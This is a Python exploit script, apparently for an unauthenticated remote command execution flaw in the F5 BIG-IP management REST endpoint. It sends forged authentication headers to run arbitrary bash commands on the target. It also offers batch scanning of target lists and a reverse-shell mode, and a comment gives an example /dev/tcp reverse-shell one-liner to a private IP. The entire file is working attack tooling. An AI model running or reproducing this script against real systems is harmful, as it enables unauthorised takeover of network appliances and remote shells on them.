import requests
import json
import sys
import argparse
import re
import json
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

t = int(time.time())

def title():
    print('''
       lazycats 

                               
    ''')
    print('''
        verification mode：python vulbig.py -v true -u target_url 
        attack mode：python vulbig.py -a true -u target_url -c command 
        Batch detection：python vulbig.py -s true -f file
        rebound mode：python vulbig.py -r true -u target_url -c command 
        ''')

def check(target_url):
    check_url = target_url + '/mgmt/tm/util/bash'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'abc',
        'Authorization': 'Basic YWRtaW46'
    }
    data = {'command': "run",'utilCmdArgs':"-c id"}
    try:
        response = requests.post(url=check_url, json=data, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            print("[+] Target {} There is a loophole".format(target_url))
        else:
            print("[-] Target {} 不There is a loophole".format(target_url))
    except Exception as e:
        print('url access exception {0}'.format(target_url))

def attack(target_url,cmd):
    attack_url = target_url + '/mgmt/tm/util/bash'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'abc',
        'Authorization': 'Basic YWRtaW46'
    }

    data = {'command': "run",'utilCmdArgs':"-c '{0}'".format(cmd)}
    try:
        response = requests.post(url=attack_url, json=data, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and 'commandResult' in response.text:
            default = json.loads(response.text)
            display = default['commandResult']
            print("[+] Target {} There is a loophole".format(target_url))
            print('[+] response is:{0}'.format(display))
        else:
            print("[-] Target {} 不There is a loophole".format(target_url))  
    except Exception as e:
        print('url access exception {0}'.format(target_url))

def reverse_shell(target_url,command):
    reverse_url = target_url + '/mgmt/tm/util/bash'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
        'Content-Type': 'application/json',
        'Connection': 'keep-alive, x-F5-Auth-Token',
        'X-F5-Auth-Token': 'abc',
        'Authorization': 'Basic YWRtaW46'
    }

    data = {'command': "run",'utilCmdArgs':"-c '{0}'".format(command)}
    # command: bash -i >&/dev/tcp/192.168.174.129/8888 0>&1
    try:
        requests.post(url=reverse_url, json=data, headers=headers, verify=False, timeout=5)
    except Exception as e:
        print("[+] Please check by yourself whether the rebound shell comes back")

def scan(file):
    for url_link in open(file, 'r', encoding='utf-8'):
            if url_link.strip() != '':
                url_path = format_url(url_link.strip())
                check(url_path)

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL mistake {0}'.format(url))


def main():
    parser = argparse.ArgumentParser("F5 Big-IP RCE")
    parser.add_argument('-v', '--verify', type=bool,help=' verification mode ')
    parser.add_argument('-u', '--url', type=str, help=' TargetURL ')

    parser.add_argument('-a', '--attack', type=bool, help=' attack mode ')
    parser.add_argument('-c', '--command', type=str, default="id", help=' Excuting an order ')

    parser.add_argument('-s', '--scan', type=bool, help=' batch mode ')
    parser.add_argument('-f', '--file', type=str, help=' file path ')


    parser.add_argument('-r', '--shell', type=bool, help=' reverse shell mode')
    args = parser.parse_args()

    verify_model = args.verify
    url = args.url

    attack_model = args.attack
    command = args.command

    scan_model = args.scan
    file = args.file

    shell_model = args.shell


    if verify_model is True and url !=None:
        check(url)
    elif attack_model is True and url != None and command != None:
        attack(url,command)
    elif scan_model is True and file != None:
        scan(file)
    elif shell_model is True and url != None and command != None:
        reverse_shell(url,command)
    else:
        sys.exit(0)     

if __name__ == '__main__':
    title()
    main()